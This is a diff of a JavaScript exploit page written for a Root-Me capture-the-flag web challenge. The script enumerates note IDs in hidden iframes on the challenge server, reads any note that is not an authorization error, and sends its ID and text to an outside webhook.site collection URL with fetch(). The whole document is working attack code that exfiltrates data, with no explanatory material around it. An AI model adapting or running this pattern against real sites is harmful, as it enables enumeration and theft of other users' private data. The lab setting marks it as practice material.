@@ -1,27 +1,42 @@
-<!DOCTYPE html>
-<html>
-<head>
-</head>
-<body>
-    <div id="status"></div>
-    <script>
-    const TARGET = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
-    const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
-function tryId(i) {
-    const iframe = document.createElement("iframe");
+<script>
+const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
+const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";
 
-    iframe.onload = () => {
-        console.log("loaded:", i);
-    };
+function tryId(start = 2811, max = 3000) {
+    let i = start;
 
-    iframe.onerror = () => {
-        console.log("error:", i);
-    };
+    function next() {
+        if (i > max) return;
 
-    iframe.src = TARGET + i;
-    document.body.appendChild(iframe);
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+
+        const currentId = i;
+
+        iframe.onload = () => {
+            try {
+                const doc = iframe.contentDocument;
+                const text = doc.body.textContent.trim();
+
+                if (text !== "You're not authorized to view this ressource!") {
+                    console.log("FOUND:", currentId);
+                    fetch(WEBHOOK + "?id=" + currentId + "&data=" + encodeURIComponent(text));
+                }
+            } catch (e) {
+                console.log("error reading", currentId);
+            }
+
+            document.body.removeChild(iframe);
+            i++;
+            setTimeout(next, 30);
+        };
+
+        iframe.src = TARGET + currentId;
+        document.body.appendChild(iframe);
+    }
+
+    next();
 }
-tryId(2810);
-    </script>
-</body>
-</html>
+
+tryId();
+</script>
